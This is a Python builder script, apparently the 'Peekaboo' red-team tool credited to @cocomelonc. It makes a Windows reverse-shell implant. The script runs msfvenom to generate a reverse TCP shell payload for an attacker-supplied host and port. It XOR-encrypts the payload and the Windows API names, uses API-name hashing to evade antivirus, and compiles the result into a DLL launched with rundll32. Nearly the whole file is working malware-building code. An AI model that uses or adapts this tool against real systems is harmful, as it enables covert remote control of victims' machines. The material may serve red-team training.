# payload encryption functions
import argparse
import subprocess
import sys
import random
import os
import hashlib
import string

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class PeekabooEncryptor():
    def __init__(self):
        self.PAYLOAD_KEY = self.random()

    def payload_key(self):
        return self.PAYLOAD_KEY

    def func_key(self):
        return self.random()

    def xor(self, data, key):
        key = str(key)
        l = len(key)
        output_str = ""

        for i in range(len(data)):
            current = data[i]
            current_key = key[i % len(key)]
            ordd = lambda x: x if isinstance(x, int) else ord(x)
            output_str += chr(ordd(current) ^ ord(current_key))

        return output_str

    def xor_encrypt(self, data, key):
        ciphertext = self.xor(data, key)
        ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
        return ciphertext, key

    def random(self):
        length = random.randint(16, 32)
        return ''.join(random.choice(string.ascii_letters) for i in range(length))

class PeekabooHasher():
    def hashing(self, data):
        hash = 0x35
        for i in range(0, len(data)):
            hash += ord(data[i]) + (hash << 1)
        return hash

def generate_payload(host, port):
    print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
    msfv = "msfvenom -p windows/x64/shell_reverse_tcp"
    msfv += " LHOST=" + host
    msfv += " LPORT=" + port
    msfv += " -f raw"
    msfv += " -o /tmp/hack.bin"
    print (Colors.YELLOW + msfv + Colors.ENDC)
    try:
        p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
        p.wait()
        print (Colors.GREEN + "reverse shell payload successfully generated :)" + Colors.ENDC)
    except Exception as e:
        print (Colors.RED + "generate payload failed :(" + Colors.ENDC)
        sys.exit()

def run_peekaboo(host, port):
    banner = """
    #####  ###### #    #         ##         #####   ####   ####
    #    # #      #   #         #  #        #    # #    # #    #
    #    # #####  ####   ##### #    # ##### #####  #    # #    #
    #####  #      #  #         ######       #    # #    # #    #
    #      #      #   #        #    #       #    # #    # #    #
    #      ###### #    #       #    #       #####   ####   ####
    by @cocomelonc, many thanks to:
    https://institute.sektor7.net/red-team-operator-malware-development-essentials
    """
    print (Colors.BLUE + banner + Colors.ENDC)
    generate_payload(host, port)
    encryptor = PeekabooEncryptor()
    hasher = PeekabooHasher()
    print (Colors.BLUE + "read payload..." + Colors.ENDC)
    plaintext = open("/tmp/hack.bin", "rb").read()
    # plaintext = open("./meow.bin", "rb").read()

    f_va = "VirtualAlloc"
    f_vp = "VirtualProtect"
    f_cth = "CreateThread"
    f_wfso = "WaitForSingleObject"
    f_rmm = "RtlMoveMemory"
    f_rce = "RunRCE"
    f_xor = "XOR"

    print (Colors.BLUE + "encrypt..." + Colors.ENDC)
    f_rce, f_xor = encryptor.random(), encryptor.random()
    ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
    ciphertext_va, va_key = encryptor.xor_encrypt(f_va, encryptor.func_key())
    ciphertext_vp, vp_key = encryptor.xor_encrypt(f_vp, encryptor.func_key())
    ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth, encryptor.func_key())
    ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
    ciphertext_rmm, rmm_key = encryptor.xor_encrypt(f_rmm, encryptor.func_key())

    kernel32_hash = hasher.hashing("kernel32.dll")
    getmodulehandle_hash = hasher.hashing("GetModuleHandleA")
    getprocaddress_hash = hasher.hashing("GetProcAddress")

    tmp = open("peekaboo.cpp", "rt")
    data = tmp.read()

    data = data.replace('unsigned char my_payload[] = { };', 'unsigned char my_payload[] = ' + ciphertext)
    data = data.replace('unsigned char s_va[] = { };', 'unsigned char s_va[] = ' + ciphertext_va)
    data = data.replace('unsigned char s_vp[] = { };', 'unsigned char s_vp[] = ' + ciphertext_vp)
    data = data.replace('unsigned char s_ct[] = { };', 'unsigned char s_ct[] = ' + ciphertext_cth)
    data = data.replace('unsigned char s_wfso[] = { };', 'unsigned char s_wfso[] = ' + ciphertext_wfso)
    data = data.replace('unsigned char s_rmm[] = { };', 'unsigned char s_rmm[] = ' + ciphertext_rmm)

    data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')

    data = data.replace('char s_va_key[] = "";', 'char s_va_key[] = "' + va_key + '";')
    data = data.replace('char s_vp_key[] = "";', 'char s_vp_key[] = "' + vp_key + '";')
    data = data.replace('char s_ct_key[] = "";', 'char s_ct_key[] = "' + ct_key + '";')
    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = "' + wfso_key + '";')
    data = data.replace('char s_rmm_key[] = "";', 'char s_rmm_key[] = "' + rmm_key + '";')

    data = data.replace('RunRCE', f_rce)
    data = data.replace('XOR', f_xor)

    print (Colors.BLUE + "calculating win API hashes..." + Colors.ENDC)
    data = data.replace('#define KERNEL32_HASH 0x00000000', '#define KERNEL32_HASH ' + str(kernel32_hash))
    data = data.replace('#define GETMODULEHANDLE_HASH 0x00000000', '#define GETMODULEHANDLE_HASH ' + str(getmodulehandle_hash))
    data = data.replace('#define GETPROCADDRESS_HASH 0x00000000', '#define GETPROCADDRESS_HASH ' + str(getprocaddress_hash))

    tmp.close()
    tmp = open("peekaboo-enc.cpp", "w+")
    tmp.write(data)
    tmp.close()

    try:
        cmd = "x86_64-w64-mingw32-g++ -shared -o peekaboo.dll peekaboo-enc.cpp -fpermissive >/dev/null 2>&1"
        os.system(cmd)
        os.remove("peekaboo-enc.cpp")
    except:
        print (Colors.RED + "error compiling template :(" + Colors.ENDC)
        sys.exit()
    else:
        print (Colors.YELLOW + cmd + Colors.ENDC)
        print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
        print (Colors.GREEN + "rundll32 .\peekaboo.dll, " + f_rce)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-l','--lhost', required = True, help = "local IP")
    parser.add_argument('-p','--lport', required = True, help = "local port", default = '4444')
    args = vars(parser.parse_args())
    host, port = args['lhost'], args['lport']
    run_peekaboo(host, port)
